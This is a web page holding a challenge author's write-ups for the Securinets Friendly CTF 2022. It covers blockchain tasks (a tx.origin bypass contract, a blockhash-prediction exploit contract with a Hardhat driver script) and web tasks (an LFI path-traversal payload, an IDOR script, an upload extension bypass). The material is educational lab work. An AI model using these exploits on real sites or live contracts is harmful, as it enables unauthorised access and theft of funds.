</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>    </span><span class="token" style="color:#569CD6">print</span><span class="token" style="color:#d4d4d4">(</span><span>mecha_resp</span><span class="token" style="color:#d4d4d4">.</span><span>text</span><span class="token" style="color:#d4d4d4">[</span><span>start_flag_index</span><span class="token" style="color:#d4d4d4">:</span><span>end_flag_index</span><span class="token" style="color:#d4d4d4">+</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">securinets{F00LY_ID0R_Is_C00L}</code></p>
<h2 class="chakra-heading css-1uc67dn" id="f4ke-upl04d">F4ke-Upl04d</h2>
<p class="chakra-text css-0" node="[object Object]">Here we will apply the basic upload filter bypass technique which is changing the file extension.</p>
<p class="chakra-text css-0" node="[object Object]">In the website, it asks only for png/pdf. So how about we modify a <code class="inline-code">document.pdf</code> to <code class="inline-code">document.pdf.png</code> ?
It&#x27;s checking for file extension only so by sending a faked file extension it gives you the flag !</p>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">securinets{4lw4y5_ch3ck_m461c_numb3r5}</code></p>
<h2 class="chakra-heading css-1uc67dn" id="after words">After words</h2>
<p class="chakra-text css-0" node="[object Object]">I am glad to see you all enjoyed our CTF and learned new things. That&#x27;s the first time I write in a CTF and I loved seeing people enjoying the CTF and some of my task (definitely not Cr4zy-Js0n). In Securinets INSAT, We are going soon to have workshops where beginners who want to advance will have the opportunity to. Follow us on social media for our upcoming news and events !</p></div></div><style data-emotion="css bgi5lz">.css-bgi5lz{min-height:67px;height:20vh;width:100vw;}</style><div id="footer-placeholder" class="css-bgi5lz"></div></div><style data-emotion="css 1pclkm">.css-1pclkm{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;z-index:var(--chakra-zIndices-banner);width:100vw;position:fixed;bottom:0px;height:6%;min-height:67px;background-color:var(--chakra-colors-darkBackground);color:var(--chakra-colors-lightBackground);}</style><footer id="main-footer" class="css-1pclkm"><style data-emotion="css 10btk8j">.css-10btk8j{font-style:400;font-size:var(--chakra-fontSizes-lg);text-align:center;}@media screen and (min-width: 30em){.css-10btk8j{font-size:var(--chakra-fontSizes-lg);}}@media screen and (min-width: 48em){.css-10btk8j{font-size:var(--chakra-fontSizes-2xl);}}</style><p class="chakra-text css-10btk8j">© Yassine Belkhadem, 2022 · All Copyrights Reserved.</p></footer><span></span></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"slug":"securinets-friendly-2k22","meta":{"title":"Securinets friendly CTF 2k22 - Author Writeups","date":"2022-10-05","cover-image-large":"https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664926666/Friendly-ctf/friendly-banner_mbdaso.jpg","cover-image-small":"https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664926666/Friendly-ctf/friendly-banner_mbdaso.jpg","tags":["Cybersecurtiy","Writeups","Event","CTF","Securinets","Blockchain","Web"],"createdAt":null},"content":"# Blockchain\n\nI was the author for the 7 blockchain challenges. The challenges' difficulties ranged from basic to medium. I wasn't intending to release the 2 last challenges but I had to give something for the advanced players.\n\n\n## 3xplorer\n\n![3xplorer](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/explorer_xsz6vl.png)\n\n1. Visit https://goerli.etherscan.io/\n2. Put the contract's address\n3. \u003e Contract section \u003e Read contract\n4. Get the flag `securinets{3xpl0r3_7h3_l4nd5_4nd_f1nd_7h3_37h3r5}`\n\n### #1 Lesson learned\n\nI know how to get informations about a contract by using a block explorer.\n\n## S0lx\n\n![S0lx](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924217/Friendly-ctf/solx_bomnck.png)\n\n1. Read the solidity file\n\n   ```js\n       string public immutable X=\"COntr4cts_\";\n       function answer() public returns (string memory) {\n           S = \"S0l1dItY_\";\n           O = \"securinets{\";\n           L = \"ARe_4w3s0m3}\";\n           return string(abi.encodePacked(O,S, X, L));\n   ```\n\n2. We are concatenating a string here using `abi.encodePacked` (encoding bytes basically and packing them together ~ low level string concatination)\n3. Get the letters content in the right order -\u003e `securinets{S0l1dItY_COntr4cts_ARe_4w3s0m3}`\n\n### #2 Lesson learned\n\nSolidity is a cool language, but it has its own way of doing things.\n\n---\n\n## Int3r4ct\n\n![Int3r4ct](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924218/Friendly-ctf/int3ra4ct_holqse.png)\n\n1. Change metamask connection to goerli testnet. [Tutorial](https://blog.cryptostars.is/goerli-g%C3%B6rli-testnet-network-to-metamask-and-receiving-test-ethereum-in-less-than-2-min-de13e6fe5677)\n\n2. Open the developer's console `CTRL+SHIT+I`\n3. Logs indicate that `web3js` and `InteractContract` are injected into the console.\n4. Now seeing the docs of `web3js` library we see that to call a contract we have to do `contractInstance.methods.methodName().call()` and it returns a promise\n   [Web3js Docs Reference](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-contract.html#methods-mymethod-call)\n5. Execute it, we should add `await` because it returns a promise. `await InteractContract.methods.FLAG().call()`\n6. Enjoy the flag `securinets{Y0u_Int3r4ct3d_With_The_Contr4ct_Usin6_The_Web3j_L1br4ry}`\n\n### #3 Lesson Learned\n\nThere are librairies with which you can craft payloads and different scripts. They can make your life a lot easier !\n\n---\n\n## Gr33dyR0b0t\n\n![Greedy Robot](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924235/Friendly-ctf/greedy-robots-ch_rnd2ve.png)\n\n1. Change metamask connection to goerli testnet. [Tutorial](https://blog.cryptostars.is/goerli-g%C3%B6rli-testnet-network-to-metamask-and-receiving-test-ethereum-in-less-than-2-min-de13e6fe5677)\n2. Do some web enumeration, you will find the robot address in a html comment\n   \u003e DEV NOTE: Hook contract to dapp 0x79089d5B521030852EdEEeF47A3cD726F3d59e7b\n\n![Send Ethers with metamask](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/send-ethers-metamask_ymvjpv.png)\n\n3. Send ethers to the robot and get the flag `securinets{p0intless_g3n3ros1tY}`\n\n### #4 Lesson learned\n\nSending money in the blockchain is so easy. But that what makes it a source of danger.\n\n---\n\n## No Man's Land\n\n![No Man's Land](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924234/Friendly-ctf/No-man-land_edtogs.png)\n\n```js\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract NoManLand {\n    mapping(address =\u003e bool) flagHolders;\n\n    event WonFlag(address indexed);\n\n    function sendFlag() public returns (bool) {\n        require(\n            tx.origin != msg.sender,\n            \"Hey you are not getting the point here\"\n        );\n        flagHolders[tx.origin] = true;\n        emit WonFlag(tx.origin);\n        return true;\n    }\n\n    function canGetFlag(address playerAddress) public view returns (bool) {\n\n        return flagHolders[playerAddress];\n    }\n}\n```\n\n1. We can notice the `require()`, it reverts the transaction when `tx.origin!=msg.sender`\n\nSo let's understand what's `tx.origin` and `msg.sender`:\n\n- `tx.origin` is the address that started the transactions.( Called a function of a contract which calls the function from another contract client -\u003e contract -\u003e contract falls all under one transaction. The client here is the `tx.origin`.\n- `msg.sender` is the direct address of the one that is calling the function. So if we got contract1 -\u003e contract2 -\u003e contract3 where `-\u003e` is a function call. The contract3 will have as `msg.sender` value the address of the contract2 and `contract2` will have as `msg.sender` value the address of contract1.\n\n[Consensys Tx.origin](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/)\n\n2. So let's craft a contract that works as an intermediate to calling the `sendFlag` function.\n\n```js\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ninterface NoManLand{\n      function sendFlag() public returns (bool) ;\n}\n\ncontract Solver {\n    NoManLand public victimContract;\n\n\n    constructor(address victimAddress){\n        victimContract=NoManLand(victimAddress);\n    }\n\n    function getFlag() public returns (bool){\n        victimContract.sendFlag();\n        return victimContract.canGetFlag(tx.origin);\n    }\n}\n```\n\nWe can use [Remix IDE](https://remix.ethereum.org/), to deploy the contract. 4. We execute the `getFlag` 3. After the transaction succeeds,We go to the website and verify.\n`securinets{F4ck_Hnm4ns_Sm4rt_C0n5racts_R0kx}`\n\n### #5 Lesson learned\n\n- `tx.origin` is a bad way to identify the other party.\n\n---\n\n## EndGame\n\n![End game](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/endgame_cfigxc.png)\n\n1. Reading the logic of the contract we find one interesting function:\n\n```js\n    function climbLeaderboard(uint256 tryhardCoeff, address realPlayerAddress)\n            public\n        {\n            // If you have a flag why do you have to call it again (just to not add useless events. I need to keep track of solves )\n            require(!flagHolders[msg.sender]);\n            require(players[realPlayerAddress], \"You are not a player\");\n            require(\n                playersHealth[realPlayerAddress] - 100 * tryhardCoeff \u003e 0,\n                \"Player is dead\"\n            );\n\n            playersHealth[realPlayerAddress] -= 200 * tryhardCoeff;\n            playersPoints[realPlayerAddress] += 100;\n\n            if (playersPoints[realPlayerAddress] \u003e 1000) {\n                emit WonFlag(tx.origin);\n                flagHolders[msg.sender]=true;\n            }\n        }\n```\n\n2. If we follow the contract's logic. We will lose the game certainly as our health will deplete faster than the points we gain. Okay so we have `playersHealth[realPlayerAddress] -= 200 * tryhardCoeff;`. It's subtracting a positive value from `uint` and has a coefficient that we control. That makes it vulnerable both logically by throwing zero to it and for the expert eyes to underflow. That means when when the result value of the operation \u003c0, it will underflow to take the maximum value which is in our case 2^265. A good article to better understand what I am talking about [Underflow and overflow article](https://hackernoon.com/hack-solidity-integer-overflow-and-underflow). I didn't want to force a solution as most are beginners and not familiar with the solidity language ^^.\n3. Okay so we have just to pass a value for the coefficient that is `\u003e=11` to cause the underflow then we spam the `climbLeaderboard` till we get an error.\n4. Here is a smart contract to do it.\n\n\u003e PS: The vulnerability is patched since the 0.5.0 [Github issue](https://github.com/ethereum/solidity/issues/796) \u003e `securinets{0d0m3t3r_4r3_Th3_G0ds_0f_0verfl000w}`\n\n### #7 Lesson learned\n\nSolidity is not the perfect language.\n\n---\n\n## Crazy Gambler\n\n![Crazy gambler](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924214/Friendly-ctf/crazy-gambler_hxbelt.png)\n\nThis task is really a challenging one. I was hesitant at first for adding it as I had simpler ones. It's the only task that forces you to write a script in web3 library. However I was surprised when a participant told me he did manually ! That's a lot of perseverance and dedication, It's truly amazing.\n\n1. Read the contract\n\n```js\n function _rollDice() internal view returns (uint256) {\n        uint256 blockNo = block.number - 1;\n        uint256 diceRes = uint256(blockhash(blockNo)) % 3;\n        return diceRes;\n    }\n\n    function trialCredit() public {\n        require(!gotTrial[msg.sender], \"You already got your trial credits\");\n        gamblersCredit[msg.sender] += 7;\n    }\n\n    function gamble(address ownerAddress) public {\n        // Fuck off, No need to emit event again.\n        require(!flagHolders[ownerAddress]);\n        uint256 roll = _rollDice();\n\n        if (roll == 0) {\n            gamblersCredit[msg.sender] += 1;\n        } else {\n            gamblersCredit[msg.sender] = 0;\n        }\n\n        // We get flag when we reach 20 !\n        if (gamblersCredit[msg.sender] ==20) {\n            flagHolders[ownerAddress] = true;\n\n            // Good bye gambler :)\n            gamblersCredit[msg.sender] = 0;\n            emit WonFlag(ownerAddress);\n        }\n    }\n```\n\nSo we are trying to mimicate randomness by using the `block number`. Okay so if you don't what are blocks in the blockchain. I really recommend [Jargon Reference](https://www.upgrad.com/blog/blockchain-architecture/). Why I said mimicate ? Well, because block number is something anyone has access to. So predicting the value is really easy.\n\nLet's craft an evil contract that will implement `_rollDice` and call the gamble if we get the `0` value.\n\n\u003e I copied and pasted the CrazyGambler contract's code from the etherscan interface.\n\nOne other interesting thing:\n\n```js\nfunction trialCredit() public {\n        require(!gotTrial[msg.sender], \"You already got your trial credits\");\n        gamblersCredit[msg.sender] += 7;\n    }\n\n```\n\nHere I am doing the check if the user got a trial or not but I am not modifying that value anywhere. So the user can get infinite `trialCredit`.\nWe can use that to get close to our target value of credits which is `20`.\nAlso, it allows the player to reuse its address.\n\nLet's craft our evil contract then..\n\n```js\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\nimport \"./CrazyGambler.sol\";\n\ncontract ExploitContract {\n    CrazyGambler crazyGambler;\n\n    constructor(address victimAddress) {\n        // Setting our target\n        crazyGambler = CrazyGambler(victimAddress);\n    }\n\n    event Gamble(uint256);\n\n    // Using the same function\n    function _rollDice() internal view returns (uint256) {\n\n        uint256 blockNo = block.number - 1;\n        uint256 diceRes = uint256(blockhash(blockNo)) % 3;\n        return diceRes;\n    }\n\n    //\n    function initThing() public {\n        crazyGambler.trialCredit();\n        crazyGambler.trialCredit();\n    }\n\n    function tryToSolve() public  {\n        uint256 res = _rollDice();\n        // The same check as in gamble\n        if (res == 0) {\n            crazyGambler.gamble(msg.sender);\n        }\n        // Here to keep track of our progress\n        uint256 currentCredit = crazyGambler.gamblersCredit(address(this));\n        // Emitting an event is like announcing something. It's really good\n        // to inform off-chain parties of on-chain updates\n        emit Gamble(currentCredit);\n    }\n}\n```\n\nI used both `hardhat` and `foundry` for scripting the exploit. We need to call the function tryToSolve till we get to 20.\n, but I will share the `hardhat` one because it's easier to understand as it's javascript code. ( well I write in Typescript. Can't live without type safety )\n\n```js\nimport { ethers, getNamedAccounts } from \"hardhat\";\nimport { CrazyGambler, ExploitContract } from \"../typechain-types\";\n\nlet crazyGambler: CrazyGambler;\nlet exploitContract: ExploitContract;\nlet deployer: string;\n\n\nconst setUp = async () =\u003e {\n    // Getting my private key\n    deployer = (await getNamedAccounts()).deployer;\n\n    // Getting the crazy gambler's address\n    const crazyGamblerAddress = \"0x55409Be51f453acCDbab41c439545FA317C0508b\"\n\n    // Uncomment to use for deploy a contract and start the exploit\n    crazyGambler = await ethers.getContractAt(\"CrazyGambler\", crazyGamblerAddress);\n    // Deploying my exploit contract\n    const exploitContractFactory = await ethers.getContractFactory(\"ExploitContract\");\n    const tx = await exploitContractFactory.deploy(crazyGamblerAddress)\n    exploitContract = await tx.deployed();\n\n    //  Comment that to reuse the contract, (might crash because a transaction fail or hit the rate limit on the Infura Node )\n    // exploitContract = await ethers.getContractAt(\"ExploitContract\", \"0x2CAa717BaA85A0B5B39798bDB9121243D84Fe2E3\");\n    console.log('deployed exploit contract', exploitContract.address)\n\n}\n\n\nconst solve = async () =\u003e {\n    let solved = false;\n\n    // Uncomment that when you are using the contract for the first time\n    await (await exploitContract.initThing({ gasLimit: 300000 })).wait(1)\n\n    // Keeping track of the balance\n    let currentBalance = (await crazyGambler.gamblersCredit(exploitContract.address)).toNumber();\n\n    console.log('current balance', currentBalance)\n\n    while (!solved) {\n        try {\n            const res = await (await exploitContract.tryToSolve({ gasLimit: 300000 })).wait()\n            console.log((res as any)?.events[0]?.args[0].toNumber())\n        }\n        catch (error: any) {\n            console.log(error.message)\n\n        }\n\n        // Updating balance\n        currentBalance = (await crazyGambler.gamblersCredit(deployer)).toNumber();\n        console.log('current balance', currentBalance)\n        // So the script don't overrun\n        if (currentBalance \u003e= 20) break;\n\n\n        // Algorithm foo\n        solved = await crazyGambler.canGetFlag(deployer, { gasLimit: 30000 });\n        console.log(\"Yes it's solved\")\n\n    }\n}\n\nasync function main() {\n    await setUp();\n    await solve();\n}\n\nmain().then(() =\u003e console.log('finished')).catch(error =\u003e {\n    console.log(error)\n})\n\n```\n\n`securinets{G4mbl1ng_Th3_Bl0ck_1s_A_MyTh}`\n\n\u003e Kudos to one participant, who did execute the script manually. It's really hard to do so. 30% chance to get a good hash ( Not really but we can say so) and with\n\u003e a block time of 15 seconds. The script should run for some time. Mine did solve it in 30 minute while. I know it's not the best way to present such a task. But that's the closest to how hacks happen on the mainnet. They needs patience.\n\n![Picture of participant conversation](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664925884/Friendly-ctf/odd_elq1gd.png)\n\n### Lesson Learned\n\n- Randomness is impossible to perform in the blockchain world without the help of off-chain solutions. Oracles are made for that. But wait how trustful are they ?\n\n---\n\n## There is more than the eye can see\n\n### Greedy Robot: the mean solution `mean for the robot ofc :)`\n\nOkay so here is the trick, there are two intended solutions to this task each one gives different insight.\n\nMost people stopped the enumeration and went to search how they can send ethers on the blockchain even that the price is high ( half what the alchemy - most generous faucet) gives you.\n\nThat's the basic challenge, but I wanted to raise the concern that in the dapps world there is huge immaturity from the developers in their approach of integrating blockchain with old technologies ( web tech in this situation ). If you check the contract's source code by using the `etherscan`.\n\n```js\nfunction canPass(address contributorAddress) public view returns (bool) {\n        return contributors[contributorAddress] \u003e= MINIMUM_CONTRIBUTION;\n    }\n```\n\nOkay so it's passing the address and checking if it has sent ethers or not. Seeing the client of the dapp, It's sending the address\n\n![Request](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/vulnerable-request_cdtawm.png)\n\nSo, the server is actually checking if the user sent the ethers or not by calling the canPass from the contract. Wait, there is no mechanism to ensure that it's the same user who sent the ethers is using the dapp right now.\n\nI even sent ethers myself to the contract so anyone can grab my address and send it to the api to get the flag :)\n\n![Other](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/greedy-robots-tx-logs_mnv9z5.png)\n\n```bash\ncurl  https://greedy-robots.ctf.securinets.tn/api/flag --json '{{\"address\":\"0x84e7a3679A82C2766Ff8382862ab883FF9460307\"}}\n```\n\n![Evil R0b0t](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924235/Friendly-ctf/evil-robot_ic0ajq.png)\n\nNow you get the challenge name `securinets{p0intless_g3n3ros1tY}`\n\n### #8 Lesson learned\n\nThe weakest link in blockchain is its integration with current technologies. Never forget the old arts !\n\n---\n\n---\n\n# Web\n\n## Cr4zy-Js0n\n\n![Cr4zy-Js0n](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924233/Friendly-ctf/crazy-json_xbuh1l.png)\n\nI really want to apologize for the confusion this task has created. I wanted to expose the beginner to JSON which is a data format commonly used in web application nowadays. Didn't mean to create confusion on getting answers to the gates. I wanted it to be a fun task :/ .\n\n#### **Solution**\n\n```bash\ncurl URL -X POST --json '{\"answers\":[{\"Gate One\":\"Man\"},{\"Gate Two\":true},{\"Gate Three\":12}]}'\n```\n\n`securinets{w3b_5p34k5_j50n_It_S4fe?}`\n\n---\n\n## Agent-007\n\n![Agent-007](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924233/Friendly-ctf/agent-007_k9g2vn.png)\n\n#### **Solution**\n\nUser-agent header to identify user's browser. Used to identify secret agents.\n\n```bash\n`curl URL -H \"User-Agent: James Bond\"`\n```\n\n## L0ki-Was-L0st\n\n![L0ki-Was-L0st](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924213/Friendly-ctf/l0ki-w4s-l0st_ynzmxn.png)\n\n\u003e I didn't watch the movie/serie It's totally inspired for my interest for Nordic/Pagan Mythology :P\n\nSimple LFI vulnerability on `page` url paramater. get the flag by visiting `URL?page=../../../flag.txt`.\n\n`securinets{L00k_4_LF1_N0T_F0R_L0K1}`\n\n## F00ly-F4ct0ry\n\n![F00ly-F4ct0ry](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924232/Friendly-ctf/fooly-f4ctory_hv3dwq.png)\n\n- [IDOR ressource](https://portswigger.net/web-security/access-control/idor)\n\n```py\nimport requests\nimport os\n\nURL='URL_HERE'\n\n\nsession = requests.Session()\nwith requests.Session() as s:\n    login_resp= s.post(URL+'/login',data={\"username\":\"test2\",\"password\":\"test2\"})\n    mecha_resp= s.get(URL+'/mecha/1')\n\n    start_flag_index=mecha_resp.text.index('securinets')\n    end_flag_index=mecha_resp.text.index('}')\n    print(mecha_resp.text[start_flag_index:end_flag_index+1])\n```\n\n`securinets{F00LY_ID0R_Is_C00L}`\n\n## F4ke-Upl04d\n\nHere we will apply the basic upload filter bypass technique which is changing the file extension.\n\nIn the website, it asks only for png/pdf. So how about we modify a `document.pdf` to `document.pdf.png` ?\nIt's checking for file extension only so by sending a faked file extension it gives you the flag !\n\n`securinets{4lw4y5_ch3ck_m461c_numb3r5}`\n\n## After words\n\nI am glad to see you all enjoyed our CTF and learned new things. That's the first time I write in a CTF and I loved seeing people enjoying the CTF and some of my task (definitely not Cr4zy-Js0n). In Securinets INSAT, We are going soon to have workshops where beginners who want to advance will have the opportunity to. Follow us on social media for our upcoming news and events !\n"}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"securinets-friendly-2k22.md"},"buildId":"0ISm-a3DlXowWUoWCA_lL","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>